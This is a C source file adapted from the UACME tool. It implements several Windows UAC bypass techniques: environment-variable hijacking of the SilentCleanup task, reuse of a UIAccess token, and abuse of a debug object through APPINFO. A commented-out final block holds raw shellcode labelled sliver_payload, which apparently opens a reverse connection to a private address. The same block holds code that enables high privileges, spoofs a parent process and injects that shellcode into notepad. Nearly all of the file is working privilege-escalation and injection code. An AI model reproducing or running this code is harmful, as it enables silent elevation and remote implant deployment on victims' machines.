/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2020
*
*  TITLE:       TYRANID.C
*
*  VERSION:     3.50
*
*  DATE:        14 Sep 2020
*
*  James Forshaw autoelevation method(s)
*  Fine Dinning Tool (c) CIA
*
*  For description please visit original URL
*  https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
*  https://tyranidslair.blogspot.com/2019/02/accessing-access-tokens-for-uiaccess.html
*  https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")

/*
* ucmxStartTask
*
* Purpose:
*
* Run target task as schtasks does.
*
*/




BOOLEAN ucmxStartTask()
{
    HRESULT hr_init, hr = E_FAIL;
    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;
    IRegisteredTask* pTask = NULL;
    IRunningTask* pRunningTask = NULL;
    VARIANT var;

    BSTR bstrTaskFolder = NULL;
    BSTR bstrTask = NULL;

    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    do {

        bstrTaskFolder = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
        if (bstrTaskFolder == NULL)
            break;

        bstrTask = SysAllocString(L"SilentCleanup");
        if (bstrTask == NULL)
            break;

        hr = CoCreateInstance(&CLSID_TaskScheduler,
            NULL,
            CLSCTX_INPROC_SERVER,
            &IID_ITaskService,
            (void**)&pService);

        if (FAILED(hr))
            break;

        var.vt = VT_NULL;

        hr = pService->lpVtbl->Connect(pService, var, var, var, var);
        if (FAILED(hr))
            break;

        hr = pService->lpVtbl->GetFolder(pService, bstrTaskFolder, &pRootFolder);
        if (FAILED(hr))
            break;

        hr = pRootFolder->lpVtbl->GetTask(pRootFolder, bstrTask, &pTask);
        if (FAILED(hr))
            break;

        hr = pTask->lpVtbl->RunEx(pTask, var, TASK_RUN_IGNORE_CONSTRAINTS, 0, NULL, &pRunningTask);
        if (FAILED(hr))
            break;

    } while (FALSE);

    if (bstrTaskFolder)
        SysFreeString(bstrTaskFolder);

    if (bstrTask)
        SysFreeString(bstrTask);

    if (pRunningTask) {
        pRunningTask->lpVtbl->Stop(pRunningTask);
        pRunningTask->lpVtbl->Release(pRunningTask);
    }

    if (pTask)
        pTask->lpVtbl->Release(pTask);

    if (pRootFolder)
        pRootFolder->lpVtbl->Release(pRootFolder);

    if (pService)
        pService->lpVtbl->Release(pService);

    if (SUCCEEDED(hr_init))
        CoUninitialize();

    return SUCCEEDED(hr);
}

/*
* ucmDiskCleanupEnvironmentVariable
*
* Purpose:
*
* DiskCleanup task uses current user environment variables to build a path to the executable.
* Warning: this method works with AlwaysNotify UAC level.
*
*/
NTSTATUS ucmDiskCleanupEnvironmentVariable(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    WCHAR   szEnvVariable[MAX_PATH * 2];

    do {

        if (_strlen(lpszPayload) > MAX_PATH)
            return STATUS_INVALID_PARAMETER;

        //
        // Add quotes.
        //

        //lpszPayload = L"C:\Windows\System32\rundll32.exe ";
        szEnvVariable[0] = L'\"';
        szEnvVariable[1] = 0;
        _strncpy(&szEnvVariable[1], MAX_PATH, lpszPayload, MAX_PATH);
        _strcat(szEnvVariable, L"\"");

        //
        // Set our controlled env.variable with payload.
        //
        if (!supSetEnvVariableEx(FALSE, NULL, T_WINDIR, szEnvVariable))
            break;

        //
        // Run trigger task.
        //
        if (ucmxStartTask())
            MethodResult = STATUS_SUCCESS;

        //
        // Cleaup our env.variable.
        //
        supSetEnvVariableEx(TRUE, NULL, T_WINDIR, NULL);

    } while (FALSE);

    return MethodResult;
}

/*
* ucmxTokenModUIAccessMethodInitPhase
*
* Purpose:
*
* Convert dll to new entrypoint/exe.
*
*/
BOOL ucmxTokenModUIAccessMethodInitPhase(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE;

    WCHAR szBuffer[MAX_PATH * 2];

    //
    // Patch Fubuki to the new entry point and convert to EXE
    //
    if (supReplaceDllEntryPoint(ProxyDll,
        ProxyDllSize,
        FUBUKI_ENTRYPOINT_UIACCESS2,
        TRUE))
    {
        //
        // Drop modified Fubuki to the %temp%
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, PKGMGR_EXE);
        bResult = supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize);
    }

    return bResult;
}

/*
* ucmTokenModUIAccessMethod
*
* Purpose:
*
* Obtain token from UIAccess application, modify it and reuse for UAC bypass.
*
*/
NTSTATUS ucmTokenModUIAccessMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS Status = STATUS_ACCESS_DENIED;
    LPWSTR lpszPayload = NULL;
    PSID pIntegritySid = NULL;
    HANDLE hDupToken = NULL, hProcessToken = NULL;
    SHELLEXECUTEINFO shinfo;
    SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
    TOKEN_MANDATORY_LABEL tml;
    SECURITY_QUALITY_OF_SERVICE sqos;
    OBJECT_ATTRIBUTES obja;
    WCHAR szBuffer[MAX_PATH * 2];

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

    do {
        //
        // Tweak and drop payload to %temp%.
        //
        if (!ucmxTokenModUIAccessMethodInitPhase(ProxyDll, ProxyDllSize))
            break;

        //
        // Spawn OSK.exe process.
        //
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, OSK_EXE);

        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = szBuffer;
        shinfo.nShow = SW_HIDE;
        if (!ShellExecuteEx(&shinfo))
            break;

        //
        // Open process token.
        //
        Status = NtOpenProcessToken(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
        if (!NT_SUCCESS(Status))
            break;

        //
        // Duplicate primary token.
        //
        sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
        sqos.ImpersonationLevel = SecurityImpersonation;
        sqos.ContextTrackingMode = 0;
        sqos.EffectiveOnly = FALSE;
        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
        obja.SecurityQualityOfService = &sqos;
        Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);
        if (!NT_SUCCESS(Status))
            break;

        NtClose(hProcessToken);
        hProcessToken = NULL;

        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
        NtClose(shinfo.hProcess);
        shinfo.hProcess = NULL;

        //
        // Lower duplicated token IL from Medium+ to Medium.
        //
        Status = RtlAllocateAndInitializeSid(&MLAuthority,
            1, SECURITY_MANDATORY_MEDIUM_RID,
            0, 0, 0, 0, 0, 0, 0,
            &pIntegritySid);
        if (!NT_SUCCESS(Status))
            break;

        tml.Label.Attributes = SE_GROUP_INTEGRITY;
        tml.Label.Sid = pIntegritySid;

        Status = NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml,
            (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
        if (!NT_SUCCESS(Status))
            break;

        RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
        si.cb = sizeof(STARTUPINFO);
        GetStartupInfo(&si);

        // 
        // Run second stage exe to perform some gui hacks.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, PKGMGR_EXE);

        if (g_ctx->OptionalParameterLength == 0)
            lpszPayload = g_ctx->szDefaultPayload;
        else
            lpszPayload = g_ctx->szOptionalParameter;

        if (CreateProcessAsUser(hDupToken,
            szBuffer,    //application
            lpszPayload, //command line
            NULL,
            NULL,
            FALSE,
            CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS,
            NULL,
            NULL,
            &si,
            &pi))
        {
            if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT)
                TerminateProcess(pi.hProcess, (UINT)-1);

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Status = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (hProcessToken) NtClose(hProcessToken);

    if (shinfo.hProcess) {
        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
        NtClose(shinfo.hProcess);
    }
    if (hDupToken) NtClose(hDupToken);
    if (pIntegritySid) RtlFreeSid(pIntegritySid);

    _strcpy(szBuffer, g_ctx->szTempDirectory);
    _strcat(szBuffer, PKGMGR_EXE);
    DeleteFile(szBuffer);

    return Status;
}

/*
* ucmxCreateProcessFromParent
*
* Purpose:
*
* Create new process using parent process handle.
*
*/
NTSTATUS ucmxCreateProcessFromParent(
    _In_ HANDLE ParentProcess,
    _In_ LPWSTR Payload)
{

    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T size = 0x30;

    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    do {
        if (size > 1024)
            break;

        si.lpAttributeList = supHeapAlloc(size);
        if (si.lpAttributeList) {

            if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
                if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), 0, 0)) //-V616
                {
                    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                    si.StartupInfo.wShowWindow = SW_SHOW;
                    
                    //getToken(&ParentProcess);

                    if (CreateProcess(NULL,
                        Payload,
                        NULL,
                        NULL,
                        TRUE,
                        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                        NULL,
                        g_ctx->szSystemRoot,
                        (LPSTARTUPINFO)&si,
                        &pi))
                    {

                        //createSacrificial(pi.hProcess);
                        //executeSliv(pi.hProcess);
                        CloseHandle(pi.hThread);
                        CloseHandle(pi.hProcess);
                        status = STATUS_SUCCESS;
                    }
                }
            }

            if (si.lpAttributeList)
                DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

            supHeapFree(si.lpAttributeList);
        }
    } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);

    return status;
}

/*
* ucmDebugObjectMethod
*
* Purpose:
*
* Bypass UAC by direct RPC call to APPINFO and DebugObject use.
*
*/
NTSTATUS ucmDebugObjectMethod(
    _In_ LPWSTR lpszPayload
)
{
    //UINT retryCount = 0;

    NTSTATUS status = STATUS_ACCESS_DENIED;

    HANDLE dbgHandle = NULL, dbgProcessHandle, dupHandle;

    PROCESS_INFORMATION procInfo;

    DEBUG_EVENT dbgEvent;

    WCHAR szProcess[MAX_PATH * 2];


    do {

        //
        // Spawn initial non elevated victim process under debug.
        //


        //do { /* remove comment for attempt to spam debug object within thread pool */

        _strcpy(szProcess, g_ctx->szSystemDirectory);
        _strcat(szProcess, WINVER_EXE);

        if (!AicLaunchAdminProcess(szProcess,
            szProcess,
            0,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_ctx->szSystemRoot,
            T_DEFAULT_DESKTOP,
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }


        //
        // Capture debug object handle.
        //

        status = supGetProcessDebugObject(procInfo.hProcess,
            &dbgHandle);

        if (!NT_SUCCESS(status)) {
            TerminateProcess(procInfo.hProcess, 0);
            CloseHandle(procInfo.hThread);
            CloseHandle(procInfo.hProcess);
            break;
        }

        //
        // Detach debug and kill non elevated victim process.
        //
        NtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hThread);
        CloseHandle(procInfo.hProcess);

        //} while (++retryCount < 20);

        //
        // Spawn elevated victim under debug.
        //
        wchar_t prog[] = L"computerdefaults.exe";

        _strcpy(szProcess, g_ctx->szSystemDirectory);
        _strcat(szProcess, prog);
        RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
        RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));

        if (!AicLaunchAdminProcess(szProcess,
            szProcess,
            1,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_ctx->szSystemRoot,
            T_DEFAULT_DESKTOP,
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //
        // Update thread TEB with debug object handle to receive debug events.
        //
        DbgUiSetThreadDebugObject(dbgHandle);
        dbgProcessHandle = NULL;

        //
        // Debugger wait cycle.
        //
        while (1) {

            if (!WaitForDebugEvent(&dbgEvent, INFINITE))
                break;

            switch (dbgEvent.dwDebugEventCode) {

                //
                // Capture initial debug event process handle.
                //
            case CREATE_PROCESS_DEBUG_EVENT:
                dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
                break;
            }

            if (dbgProcessHandle)
                break;

            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);

        }

        if (dbgProcessHandle == NULL)
            break;

        //
        // Create new handle from captured with PROCESS_ALL_ACCESS.
        //

        dupHandle = NULL;
//        dupHandle= OpenProcess(PROCESS_ALL_ACCESS, TRUE, dbgProcessHandle);
        status = NtDuplicateObject(dbgProcessHandle,
            NtCurrentProcess(),
            NtCurrentProcess(),
            &dupHandle,
            PROCESS_ALL_ACCESS,
            0,
            0);

        if (NT_SUCCESS(status)) {
            //
            // Run new process with parent set to duplicated process handle.
            //
            //ucmxCreateProcessFromParent(dupHandle, lpszPayload);
            elevateNInject(dupHandle);
            NtClose(dupHandle);
        }



#pragma warning(push)
#pragma warning(disable: 6387)
        DbgUiSetThreadDebugObject(NULL);
#pragma warning(pop)

        NtClose(dbgHandle);
        dbgHandle = NULL;

        CloseHandle(dbgProcessHandle);

        //
        // Release victim process.
        //
        CloseHandle(procInfo.hThread);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hProcess);

    } while (FALSE);

    if (dbgHandle) NtClose(dbgHandle);
    supSetGlobalCompletionEvent();
    return status;
}
/*
unsigned char sliver_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x4d, 0x31, 0xc9,
  0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f,
  0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x50,
  0x8b, 0x48, 0x18, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x4d, 0x31, 0xc9, 0x48,
  0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58,
  0x41, 0x58, 0x5e, 0x48, 0x01, 0xd0, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49,
  0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49,
  0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
  0x49, 0xbc, 0x02, 0x00, 0x04, 0xd2, 0xc0, 0xa8, 0x38, 0x01, 0x41, 0x54,
  0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,
  0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41,
  0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50,
  0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
  0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf,
  0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89,
  0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5,
  0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00,
  0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9,
  0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8,
  0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20,
  0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00,
  0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4,
  0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31,
  0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba,
  0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58,
  0x41, 0x57, 0x59, 0x68, 0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6a, 0x00,
  0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41,
  0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c,
  0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6,
  0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0xbb, 0xe0, 0x1d,
  0x2a, 0x0a, 0x41, 0x89, 0xda, 0xff, 0xd5
};



unsigned int calc_len = 511;


void encryptDecryptP(char* input, char* key, size_t key_len, size_t data_len) {

    char test;
    char xormod;
    for (int i = 0; i < strlen(input); i++) {

        xormod = key[i % (key_len)];
        test = input[i] ^ xormod;
        if (test != '\0') {
            input[i] = input[i] ^ xormod;
        }
        else {
            //printf("got one %c\n", test);
        }
    }
}


BOOL(WINAPI* pVirtProt)(LPVOID lpAddr, SIZE_T dwS, DWORD flNewProt, PDWORD oldProt);
LPVOID(WINAPI* pvAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
//VOID (WINAPI * rtlMM) (_Out_ VOID UNALIGNED *Destination, _In_  const VOID UNALIGNED *Source,_In_ SIZE_T Length);
HANDLE(WINAPI* pcrThre) (
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
    );
FARPROC(WINAPI* pGetProc)(
    HMODULE a,
    LPCSTR  b
    );
LPVOID(WINAPI* pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

BOOL(WINAPI* pWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

DWORD(WINAPI* pRtlCreateUserThread)(
    IN HANDLE 					ProcessHandle,
    IN PSECURITY_DESCRIPTOR 	SecurityDescriptor,
    IN BOOL 					CreateSuspended,
    IN ULONG					StackZeroBits,
    IN OUT PULONG				StackReserved,
    IN OUT PULONG				StackCommit,
    IN LPVOID					StartAddress,
    IN LPVOID					StartParameter,
    OUT HANDLE 					ThreadHandle,
    OUT LPVOID					ClientID
    );


BOOL elevateNInj(_In_ HANDLE hProc, _In_ HANDLE parentProc) {
    SIZE_T size = 0x30;

    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    if (size > 1024) { return FALSE; }

    si.lpAttributeList = supHeapAlloc(size);
    if (!si.lpAttributeList) { return FALSE; }

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) { return FALSE; }
    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProc, sizeof(HANDLE), 0, 0)) //-V616
    {
        return FALSE;
    }
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_SHOW;
    wchar_t payload[] = L"C:\\Windows\\System32\\notepad.exe";
    if (!CreateProcess(NULL,
        payload,
        NULL,
        NULL,
        TRUE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        (LPSTARTUPINFO)&si,
        &pi))
    {
        return FALSE;
    }
    
    
    //Duplicate Process token and use to wreak havoc
    //***************************************************************
    //***************************************************************


    HANDLE token;


    if (!OpenProcessToken(pi.hProcess, TOKEN_ALL_ACCESS, &token))
    {
        return FALSE;
    }

    int privCount = 7;

    PRIVARR tp;
    tp.PrivilegeCount = privCount;
    LUID luid;

    DWORD dError;

    wchar_t* privs[7] = { '\0' };
    privs[0] = L"SeDebugPrivilege";
    privs[1] = L"SeLoadDriverPrivilege";
    privs[2] = L"SeTakeOwnershipPrivilege";
    privs[3] = L"SeBackupPrivilege";
    privs[4] = L"SeImpersonatePrivilege";
    privs[5] = L"SeIncreaseQuotaPrivilege";
    privs[6] = L"SeAssignPrimaryTokenPrivilege";

    //enablePrivs(dupToken, privCount, privs);

    for (int i = 0; i < privCount; i++) {
        if (!LookupPrivilegeValue(
            NULL,            // lookup privilege on local system
            privs[i],   // privilege to lookup 
            &luid))        // receives LUID of privilege
        {
            return FALSE;
        }

        tp.Privileges[i].Luid = luid;
        tp.Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;

    }

    if (!AdjustTokenPrivileges(
        token,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))

    {
        return FALSE;
    }
    HANDLE dupToken = NULL;
    if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &dupToken))
    {
        return FALSE;
    }
    //if (!ImpersonateLoggedOnUser(dupToken))
    //{
    //    return FALSE;
    //}

    HANDLE dupHandle = NULL;

    NtDuplicateObject(pi.hProcess,
        NtCurrentProcess(),
        NtCurrentProcess(),
        &dupHandle,
        PROCESS_ALL_ACCESS,
        0,
        0);

    //if (!SetThreadToken(NULL, dupToken)) {

    //	return FALSE;
    //}
    HANDLE mytoke = GetCurrentProcessToken;


    wchar_t sacProc[] = L"C:\\Windows\\System32\\notepad.exe";
    STARTUPINFOEX si2;
    PROCESS_INFORMATION pi2;
    RtlSecureZeroMemory(&pi2, sizeof(pi2));
    RtlSecureZeroMemory(&si2, sizeof(si2));
    
    si2.StartupInfo.cb = sizeof(STARTUPINFOEX);

    if (size > 1024) { return FALSE; }

    //si2.lpAttributeList = supHeapAlloc(size);
    si2.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        0,
        size
    );
    if (!si2.lpAttributeList) { return FALSE; }

    if (!InitializeProcThreadAttributeList(si2.lpAttributeList, 1, 0, &size)) { return FALSE; }
    if (!UpdateProcThreadAttribute(si2.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &dupHandle, sizeof(HANDLE), 0, 0)) //-V616
    {
        return FALSE;
    }
    si2.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si2.StartupInfo.wShowWindow = SW_SHOW;
    
    
    if (!CreateProcess(NULL,
        sacProc,
        NULL,
        NULL,
        TRUE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        (LPSTARTUPINFO)&si2,
        &pi2))
    {
        return FALSE;
    }

    if (!ImpersonateLoggedOnUser(dupToken))
{
    return FALSE;
}
    hProc = pi2.hProcess;

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    BOOL bStatus = FALSE;

    pVirtualAllocEx = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAllocEx");
    pWriteProcessMemory = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "WriteProcessMemory");
    pRtlCreateUserThread = GetProcAddress(GetModuleHandle(L"Ntdll.dll"), "RtlCreateUserThread");

    pRemoteCode = pVirtualAllocEx(hProc, NULL, calc_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)sliver_payload, (SIZE_T)calc_len, (SIZE_T*)NULL)) {
        return FALSE;
    }

    bStatus = pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, &hThread, NULL);
    //CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, 0, 0, 0);
    if (bStatus != FALSE) {
        WaitForSingleObject(hThread, -1);
        CloseHandle(hThread);
        return 0;
    }
    else
        return FALSE;

}

*/